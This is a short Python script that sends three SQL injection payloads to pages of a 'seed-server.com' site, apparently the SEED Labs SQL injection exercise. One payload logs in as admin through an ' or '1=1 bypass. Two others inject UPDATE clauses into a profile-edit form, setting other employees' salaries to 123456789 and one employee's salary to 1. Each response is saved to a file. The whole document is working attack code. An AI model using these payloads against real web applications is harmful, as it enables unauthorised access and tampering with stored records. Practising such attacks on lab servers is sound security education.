
import requests
session=requests.Session()
hackString1="http://www.seed-server.com/unsafe_home.php?username=admin%27+or+%271%3D1&Password="
res=session.get(hackString1)
print(res.text)
with open('response.html','w') as file:
	file.write(res.text)

hackstring2="http://www.seed-server.com/unsafe_edit_backend.php?NickName=%27%2C+salary%3D123456789+where+eid%21%3D20000%23&Email=&Address=&PhoneNumber=&Password="
res=session.get(hackstring2)
print(res.text)
with open('response2.html','w') as file:
	file.write(res.text)

hackstring3="http://www.seed-server.com/unsafe_edit_backend.php?NickName=%27%2C+salary%3D1+where+eid%3D20000%23&Email=&Address=&PhoneNumber=&Password="
res=session.get(hackstring3)
print(res.text)
with open('response3.html','w') as file:
	file.write(res.text)
